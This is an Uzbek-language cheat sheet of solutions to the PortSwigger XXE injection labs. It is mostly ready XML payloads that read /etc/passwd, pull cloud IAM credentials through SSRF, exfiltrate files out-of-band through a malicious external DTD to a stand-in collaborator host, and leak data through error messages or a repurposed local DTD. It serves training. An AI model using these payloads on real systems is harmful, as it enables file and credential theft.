# XXE Injection — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**, Collaborator = **COLLAB.example.net**.
> Nishon odatda `POST /product/stock` (XML body): `<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>`.
> DOCTYPE'ni XML declaration bilan `<stockCheck>` orasiga qo'yasan.

### Retrieve files (classic XXE) — APPRENTICE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
> Javobda "Invalid product ID:" dan keyin `/etc/passwd` chiqadi.

### XXE → SSRF (cloud metadata) — APPRENTICE
```xml
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```
> `productId` = `&xxe;`. URL'ni bosqichma: `.../latest/meta-data/iam/security-credentials/admin`
> → JSON ichida `SecretAccessKey`.

### XInclude attack — PRACTITIONER
To'liq XML'ni boshqarolmasang (faqat bitta parametr), XInclude ishlatasan.
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
> `parse="text"` muhim — bo'lmasa XML parse qilib yiqiladi.

### XXE via file upload (SVG) — PRACTITIONER
Avatar SVG → Batik parser external entity'ni render qiladi.
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```
> `exploit.svg` qilib avatar sifatida upload → comment'da rasm ichida hostname chiqadi.

---

## Blind XXE

### OOB interaction — PRACTITIONER
```xml
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://COLLAB.example.net"> ]>
```
> `productId` = `&xxe;`. Collaborator → Poll now → DNS/HTTP interaction.

### OOB via parameter entities — PRACTITIONER
Oddiy entity bloklansa, parameter entity (`%`) ishlatasan.
```xml
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://COLLAB.example.net"> %xxe; ]>
```

### OOB exfiltration (malicious external DTD) — PRACTITIONER
Exploit serverda DTD joylaysan, u faylni o'qib Collaborator'ga query sifatida jo'natadi.
`exploit.dtd` (exploit.example.net'da):
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB.example.net/?x=%file;'>">
%eval;
%exfil;
```
So'rov body'siga:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit.example.net/exploit.dtd"> %xxe;]>
```
> Collaborator HTTP interaction'ida `x=<hostname>` chiqadi.

### Data retrieval via error messages — PRACTITIONER
Faylni mavjud bo'lmagan path'ga qo'yib, xato matnida chiqarasan.
`exploit.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
So'rov body'siga:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit.example.net/exploit.dtd"> %xxe;]>
```

### Repurposing a local DTD (tashqi DTD bloklangan) — PRACTITIONER
Serverdagi mavjud DTD'ni (masalan Yelp `docbookx.dtd`) import qilib, ichidagi entity'ni qayta
ta'riflab xato chiqarasan.
```xml
<!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error; '> %local_dtd; ]>
```

---

### Eslatma
Blind XXE'da OOB > error > local-DTD tartibida sina. Himoya: DTD/external entity'ni o'chir
(libxml `noent` off), XInclude o'chir. Umumiy: bu papka README.
